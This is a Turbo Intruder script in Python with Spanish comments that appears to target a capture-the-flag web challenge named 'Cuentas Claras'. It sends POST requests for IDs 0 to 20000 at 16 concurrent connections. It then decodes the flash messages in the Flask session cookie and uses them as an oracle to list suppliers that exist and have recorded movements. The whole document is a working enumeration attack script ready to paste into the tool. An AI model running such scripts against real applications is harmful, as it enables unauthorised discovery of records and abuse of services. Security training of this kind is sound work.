# Turbo Intruder - Cuentas Claras: enumerar proveedores con movimientos > 0
#
# El resultado de POST /movimientos/<id> viene en el flash de la cookie de sesion
# Flask (header Set-Cookie), NO en el body (que es siempre un 302 "Redirecting...").
#   - existe:    {"_flashes":[[" t",["ok","Proveedor #<id>: <N> movimientos registrados."]]]}
#   - no existe: {"_flashes":[[" t",["error","No se pudo contar..."]]]}
# Por eso filtramos sobre el Set-Cookie decodificado, no sobre el status (siempre 302).
#
# Request base (pegar en Turbo Intruder, marcar el %s):
#   POST /movimientos/%s HTTP/1.1
#   Host: chl-d145726d-7da9-4bf1-aebc-e0c8d5ea3d71-cuentas-claras.b.softwareseguro.com.ar
#   User-Agent: Mozilla/5.0
#   Content-Length: 0
#   Connection: keep-alive
#
import base64, re

RANGE_START = 0
RANGE_END   = 20001   # amplio: cubre ids altos reservados del seed

def b64url_decode(s):
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * ((4 - len(s) % 4) % 4)
    try:
        return base64.b64decode(s).decode('utf-8', 'replace')
    except Exception:
        return ''

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=16,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(RANGE_START, RANGE_END):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    m = re.search(r'session=([^;\s]+)', req.response or '', re.I)
    if not m:
        return
    token = m.group(1).split('.')[0]          # payload del flash
    flash = b64url_decode(token)
    hit = re.search(r'Proveedor #(\d+): (\d+) movimientos', flash)
    if hit:
        pid, n = hit.group(1), int(hit.group(2))
        if n > 0:                              # solo los que tienen movimientos (seed)
            table.add(req)
            print('id=%s  movimientos=%d' % (pid, n))
    # "No se pudo contar" => proveedor inexistente => se ignora
